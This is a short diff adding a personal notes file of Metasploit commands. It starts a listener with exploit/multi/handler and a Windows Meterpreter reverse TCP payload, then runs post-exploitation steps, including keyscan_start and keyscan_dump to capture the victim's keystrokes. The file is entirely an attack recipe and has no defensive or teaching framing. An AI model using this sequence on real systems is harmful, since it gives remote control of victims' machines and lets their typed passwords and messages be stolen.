@@ -1,0 +1,14 @@
+service postgresql start
+sudo msfconsole
+ use exploit/multi/handler
+set PaYLOAD windows/meterpreter/reverse_tcp
+show option
+set LHOST u r ip
+
+msfvenom -h
+
+exploit
+pwd ls
+mkdir
+keyscan_start
+keyscan_dump
